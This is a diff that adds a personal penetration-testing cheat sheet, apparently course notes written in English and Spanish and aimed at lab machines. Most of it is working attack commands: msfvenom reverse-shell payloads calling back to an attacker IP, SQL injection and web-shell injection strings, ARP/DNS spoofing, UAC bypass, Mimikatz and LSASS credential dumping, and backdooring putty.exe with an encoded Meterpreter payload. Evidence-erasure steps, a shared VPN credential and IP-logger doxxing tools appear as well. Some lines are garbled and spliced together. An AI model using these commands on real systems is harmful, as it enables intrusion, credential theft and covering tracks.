@@ -1,0 +1,356 @@
+			
+			COMMANDS/ROUTES\
+
+-SCAN WITH STYLE SHEET
+sudo nmap -v --reason -sS -oX puertos.xml --stylesheet="https://svn.nmap.org/nmap/docs/nmap.xsl" 192.168.56.104-115
+
+-Access MYSQL ubuntu
+sudo mysql -u root -p 
+mutillidae
+
+-Use Netcat
+For local terminal:
+nc -l -p 4444
+nc localhost 4444
+For other mahines:
+Recepetor: nc -l -p 4444
+Transmitter: nc -n ipreceptor 4444
+
+WITH FILES
+R: nc -vl 44444 > nombre_del_archivo_recibido
+T: nc -N 192.168.0.103 44444 < /ruta/al/archivo/para/enviar/
+
+-Hashes Linux
+cat /etc/passwd
+cat /etc/shadow
+
+-UNZIP Files
+.gz: gzip -d index.php.gz
+.tar: tar -xvf paquete.tar 
+-zip. unzip archivo.zip
+
+Ping
+cd exploit-CVE-2015-3306-master
+./exploit.py -h 
+./exploit.py --host 192.168.56.115 --port 21 --path "/var/www/html/"
+EXECUTE HAVING A LISTENER ON MSFCONSOLE
+./exploit.py iptarget 6667 -payload python
+
+-GET INTO NESSUS
+/bin/systemctl start nessusd.service
+
+-DELETE WATERMARK REPORTS NESSUS
+document.querySelector('#nessus-watermark').remove()
+
+-VPN BOOK (Open terminal since file of VPN, after, sudo open namefile)
+Username: vpnbook
+Password: z93cvfv
+
+-PHONEINFOGA
+phoneinfoga scan -n "6441533452"
+
+-TO METASPLOIT (msfconsole)
+cd /usr/share/metasploit-framework
+LISTENER OF METASP:
+use exploit/multi/handler
+-RUTE
+/usr/share/metasploit-framework/modules/exploits/windows/rdp
+/usr/share/metasploit-framework/modules/payloads/singles/python
+
+-MSFVENOM
+(Single payload)
+msfvenom -p python/shell_reverse_tcp.rb lhost=192.168.56.105 lport=4444
+(Stage Payload)
+msfvenom -p python/meterpreter/reverse_http lhost=192.168.56.105 lport=4444
+LINUX METERPRETER
+msfvenom -p python/meterpreter/reverse_tcp lhost=192.168.56.105 lport=4444
+
+-MYSQL REQUEST
+Route: /var/lib/mysql-files/
+' union select database()--
+' union select null, table_name, null, null,  null,  null,  null from information_schema.tables --
+' union select null, version(), null, null,  null,  null,  null  -- 
+' union select null, @@secure_file_priv, null, null, null, null, null -- 
+' union select null, load_file('/var/lib/mysql-files/prueba.txt'), null, null, null, null, null -- 
+Timing attacks
+' union select null, sleep(20), null, null,  null,  null,  null  -- 
+Get into DB of Ubuntu
+sudo mysql -u root @ localhost
+
+-SQLMAP
+sqlmap --flush-session -r /home/kali/Desktop/Peticion1.txt
+sqlmap --flush-session -r /home/kali/Desktop/Peticion1.txt
+sqlmap -r /home/kali/Desktop/Peticion1.txt --ignore-redirects --batch --technique B -p username --passwords 
+sqlmap -r /home/kali/Desktop/Peticion1.txt --ignore-redirects --batch --dbs -v 3
+sqlmap -r /home/kali/Desktop/Peticion1.txt --ignore-redirects --batch --dump -D mutillidae
+sqlmap -r /home/kali/Desktop/Peticion1.txt --ignore-redirects --batch --dump -T accounts -D mutillidae
+
+-PATH TRANSVERSAL
+En windows utilizamos /
+http://192.168.56.102/mutillidae/index.php?page=../../../../../etc/passwd
+
+-WEB SHELLS
+' union select null,null,null,null,null,null,'<?php echo passthru($_GET["cmd"]); ?>' INTO DUMPFILE '../../../../../var/www/html/mutillidae/backdoor.php' --
+The correct is:
+' union sel' union select null,null,null,null,null,null,'<form action="" method="post" enctype="application/x-www-form-urlencoded"><table style="margin-left:auto; margin-right:auto;"><tr><td colspan="2">Please enter system command</td></tr><tr><td></td></tr><tr><td class="label">Command</td><td><input type="text" name="pCommand" size="50"></td></tr><tr><td></td></tr><tr><td colspan="2" style="text-align:center;"><input type="submit" value="Execute Command" /></td></tr></table></form><?php echo "<pre>";echo shell_exec($_REQUEST["pCommand"]);echo "</pre>"; ?>'INTO DUMPFILE '../../../../../var/www/html/mutillidae/backdoor.php' --ect null,null,null,null,null,null,'<?php echo passthru($_GET["cmd"]); ?>' INTO DUMPFILE '../../../../../var/www/html/mutillidae/backdoor.php' --
+More web shells on user info of mutillidae
+
+-HTML INJECTION / XSS
+<h1>canario</h1>: Convierte texto a header
+JS Injection
+<script>alert("Vulnerabilidad XSS")</script>
+
+-XSSTRIKE
+sudo python3 xsstrike.py -h
+sudo python3 xsstrike.py -u "http://192.168.56.102/mutillidae/index.php?page=user-info.php" --timeout 50
+
+-BETTERCAP
+sudo apt install golang git build-essential libpcap-dev libusb-1.0-0-dev libnetfilter-queue-dev
+go install github.com/bettercap/bettercap@latest
+sudo go/bin/bettercap (Open Bettercap Terminal
+)
+sudo go/bin/bettercap -eval "caplets.update; ui.update; q" (Install UI)
+sudo go/bin/bettercap -caplet http-ui (Open UI)
+TRUE STEPS:
+sudo apt update
+sudo apt install bettercap
+sudo bettercap
+
+set arp.spoof.targets 10.0.2.7
+arp.spoof on
+set dns.spoof.domains facebook.es	
+set dns.spoof.adress 10.0.2.4 (Propia)
+dns.spoof on
+
+
+sudo echo "<h1>Visitando sitio web ATTACK</h1>" > index.html
+
+
+-ANACONDA2 USE (POLYMORPH) (Gestion de entornos virtuales)
+anaconda3/bin/conda
+anaconda3/bin/conda create -n polymorph python=3.8
+anaconda3/bin/conda unit zsh
+conda deactivate
+conda activate (Open or close enviroment)
+
+conda activate polymorph
+
+ln -s /usr/lib/x86_64-linux-gnu/libc.a /usr/lib/x86_64-linux-gnu/liblibc.a (Enlace simbolico entre librerias)
+
+-SETOOLKIT
+Route for reports:
+/root/.set/reports/2022-06-20 22:56:56.938777.xml
+
+-POLYMORPH (FUNCTIONS EX)
+
+functions -a icmp_func -e emacs
+
+def icmp_func(packet):
+    if packet['IP']['proto'] == 1:
+        print("He recibido un paquete ICMP")
+        if packet['ICMP']['type'] == 8:
+            print("El paquete de red es ICMP Request")
+            packet['ICMP']['data'] = packet['ICMP']['data'][:-8] + b'attacker'
+        else:
+            packet['ICMP']['data'] = packet['ICMP']['data'][:-8] + b'01234567'
+    else:
+       print("He recibido otro paquete de red")
+
+    # your code here
+
+    # If the condition is meet
+    return packet
+
+-MOSQUITTO (Manipulation of traffic MQTT)
+ps -ef | grep mosquitto (If error exist)
+sudo kill number
+
+mosquitto -d (For start)
+mosquitto_sub -t temperatura (T= Topic)
+
+IN MACHINE WHO SEND PACKETS:
+mosquitto_pub -t temperatura -m 40 -h ipmaquinaquerecibe
+
+-Protocolo de Registro Remoto de Windows
+NAT mode, Add IP on winreg for communication, Polymorph, ARPspoofing, capture -f winreg,
+show, template 213(See since wireshark), show, dump, layer winreg, show, field -a winreg_value, bytes 282:288(See on wireshark)
+field 4 (bytes), show, functions -a winreg_set_value -e emacs, show, functions -s, intercept
+
+def winreg_set_value(packet):
+    try:
+        if packet['DCERPC']['opnum'] == 22:
+            packet['WINREG']['winreg_value'] = b'N\x00E\x00W\x00'
+            print("Paquete set value modificado")
+        return packet
+    except:
+        return packet
+
+-Post-Explotation
+
+Since msf6
+use post/multi/recon/local_exploit_suggester (Module to suggest exploits)
+
+Since /usr/share/metasploit-framework/modules/post/linux/gather (Modules to get info)
+checkvm.rb (See if we have a VM)
+
+Since METERPRETER
+getuid (Get usuary)
+run post/linux/gather/checkvm
+run post/linux/gather/enum_network
+run post/linux/gather/enum_system
+background (Send to second plane the actually session)
+
+Linux METERPRETER
+Since msf6:
+use exploit/multi/handler
+create payload with:
+msfvenom -p python/meterpreter/reverse_tcp lhost=192.168.56.105 lport=4444
+set payload python/meterpreter/reverse_tcp
+Since /Desktop/UnrealIRCd-3.2.8.1-Backdoor-master
+./exploit.py 192.168.56.104 6667 -payload python
+msf6:
+use exploit/linux/local/docker_daemon_privilege_escalation
+set payload linux/x86/meterpreter/reverse_tcp
+set lhost
+
+Fix payload error
+sudo emacs /usr/share/metasploit-framework/modules/exploits/linux/local/docker_daemon_privilege_escalation.rb
+
+Windows Meterpreter
+use exploit/multi/script/web_delivery (Generate payload to copy en paste on shell)
+set target 2
+set payload windows/x64/meterpreter/reverse_tcp
+use post/multi/recon/local_exploit_suggester
+Vulnerable to:
+exploit/windows/local/bypassuac_dotnet_profiler
+exploit/windows/local/bypassuac_sdclt
+
+Since METERPRETER
+getuid
+getsystem -h
+getsystem (Try techniques to privileges)
+sysinfo
+run post/windows/gather/checkvm
+run post/windows/gather/hashdump
+
+Elevation of privileges (UAC BYPASS)
+
+use exploit/multi/script/web_delivery 
+set payload windows/x64/meterpreter/reverse_tcp
+target 2 - copy payload & paste on windows psh - search UAC - use 12
+(exploit/windows/local/bypassuac_dotnet_profiler)
+
+-Memory dump with Mimikatz
+Make attack of (Windows Meterpreter)- Elevate privileges UAC- On session 2:
+getsystem - load kiwi - creds_all - kiwi_cmd sekurlsa::logonPasswords
+Copy NTLM and in other terminal -> echo "7ce21f17c0aee7fb9ceba532d0546ad6" > hash.ntlm
+john hash.ntlm --format=NT --show
+
+-Prodcump(Tool for dump hash and passwd of the O.S) y lssas.exe
+download on browser ->procdump sysinternals
+dump lssas file since de Task manager on windows
+since admin cmd get into the carpet of procdump(cd)
+procdump64.exe -accepteula -ma lsass.exe lsass.dmp
+
+-John the Ripper y hashcat
+echo -n "01234" | sha256sum | cut -f 1 -d " " > hash.sha256 (Create Hash)
+john --format=raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash.md5
+john --format=raw-md5 hash.md5 --show
+hashcat -m 0 -a 0 hash.md5 /usr/share/wordlists/rockyou.txt (-a 0 Use Dictionary)
+hashcat -m 0 -a 0 hash.md5 --show  (-m is type)
+hashcat -m 0 -a 3 hash.md5 --show (-a 3 Use Brute Force)
+
+Correct form: John (Follow Order)
+echo -n "abc123" | sha256sum | cut -f 1 -d " " > password
+john --format=raw-sha256 password
+john --format=Raw-SHA256 password --show 
+
+If we have a hash of the target
+emacs hash.txt
+john hash.txt (See with John the type of hash)
+john --format=-Raw-SHA512 hash.txt --show
+With Hashcat EDIT the hash (Clean with emacs)
+hashcat -m 1800 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 1800 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --show
+
+-Backdoors on binarys
+Download Putty:
+wget http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe
+msfvenom -a x86 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=192.168.56.105 lport=4000 -e x86/shikata_ga_nai -i 3 -b "\x00" -f exe -o puttyX.exe
+msfconsole - use exploit/multi/handler - Move .exe to windows - execute
+
+-Migration of meterpreter to other process
+Since meterpreter of the backdoor on windows
+run post/windows/manage/migrate
+if it not works: migrate -N explorer.exe
+
+-Erasure of evidence
+LINUX (See file of routes on the course for delete evidences)
+shred -vfz test.txt (Tool for delete files and overwrite on the memory zone)
+rm -v test.txt (tool for delete a file of safe way - 38 Especial passes)
+WINDOWS
+Since meterpreter of windows:
+run post/windows/manage/sdel FILE=C:\\users\\IEUser\\Desktop\\New.txt
+
+-BATEA (Acknowledgment of host)
+If an error ocurrs use anaconda:
+conda create -n batea_env pip python=3.7
+conda activate batea_env
+pip install -r requirements
+sudo nmap -A 192.168.0.0/16 -oX output.xml
+Or
+# Partial info
+sudo nmap -O -sV 192.168.0.0/16 -oX output.xml
+batea -v output.xml
+
+-PESIDIOUS
+On ubutu: https://github.com/CyberForce/Pesidious.git
+sudo add-apt-repository ppa:deadsnakes/ppa (If an error occurs use: sudo apt-get install --reinstall ca-certificates)
+sudo apt-get update - sudo apt-get install python3.6 - 
+curl https://boostrap.pypa.io/get-pip.py | sudo -H python3.6 - pico pip_requiements/requirements.txt
+python3.6 -m pip install -r pip_requirements/requirements.txt
+
+-EMACS
+C+xb:Save
+C+y:Paste
+Alt+x -> replace string (enter) etc...
+Alt+x -> comment region
+---------------------------------------------------------------------
+- Customizing the work environment
+echo $$ (PID actual process) - cd /proc (Virtual Files System - Params of actual process) - cd /proc/7240 - ls -l exe (See type of shell)
+sh - ls -l /proc/$$/exe(See defect shell) - bash... - Ohmyzsh git(curl) - powerlevel10k git clone - emacs .zshrc - ZSH_THEME="powerlevel10k/powerlevel10k" - restart terminal
+emacs .p10k.zsh - zsh-syntax-highlighting gitclone on ohmyzsh part -  zsh autosuggestions gitclone same part - emacs .zshrc (Add under git ->zsh-autosuggestions zsh-syntax-highlighting)
+-Snort
+On windows terminal verify: C:\Snort\etc> notepad .\snort.conf - 
+
+---------------------------------------------------------------------
+			TOOLS/\
+
+Recopilación pasiva de información: Google Hacking, Shodan, Censys, Whois, Archive, TheHarvester, Maltego, Recon-ng
+
+Recopilación semi-pasiva de información: FOCA, CentralOps, DNSDumpster, Wireshark, TCPdump
+
+Recopilación activa de información: Metasploitable 3, DNSrecon, Nmap, Amap
+
+Análisis de vulnerabilidades: CVE, CVSS, CPE, Nessus
+
+Explotación de vulnerabilidades en Hosts: Metasploit, Msfvenom (H. para creacion de payloads personalizados), Armitage (Interfaz grafica de Metasploit)
+
+Explotación de vulnerabilidades en aplicaciones web: Mutillidae (App web vulnerable), Spidering && Crawling (Proceso de reconocimiento/recoleccion de apartados de app web), Skipfish (Spidering activo - Analiza y recolecta todos los apartados de la app web) Burp Suite (Proxy de interceptacion), SQL Injection, SQLmap, Path Traversal (Inyeccion de codigo en el contexto de una ruta al sistema de ficheros), WebShells (Scripts/Frag. de codigo que se inyectan en la maquina que aloja la app o el servidor web para lograr persistencia y la ejecucion remota de comandos)
+Cross-Site-Scripting (XSS), HTML Injection, CSRF(Forzamiento de accion hacia usuario legitimo logueado en app web), XSStrike(H. de automatizacion de ataques XSS, detecta vul, en app o serv. web)
+
+Explotación de vulnerabilidades en red: Bettercap(Tool for ARP-DNS Spoofing), MITM, ARP Spoofing, DNS Spoofing, Social Engineering Toolkit (SET), Polymorph(Tool for modification of packages on real time and automation of arp and dns spoofing)
+
+Post-Explotación: Meterpreter, Procdump, John the ripper, Hashcat, Backdoors en binarios, srm & shred(Tools for delete evidences)
+
+Machine Learning aplicado a Hacking: Batea(Tool for classify machine priority), Pesidious(Malware mutation), Deep fake
+
+	EXTRA TOOLS
+
+Kithack: Many tools - Hacking
+PhoneInfoga: Info. Phone Numbers
+Grabify IP Loggers: Doxxing of IP (Page)
+NordVPN: IP Lookup - Geolocation (Page)
+
+Mimikatz(Tool for obtain hashs, passwords etc)
+
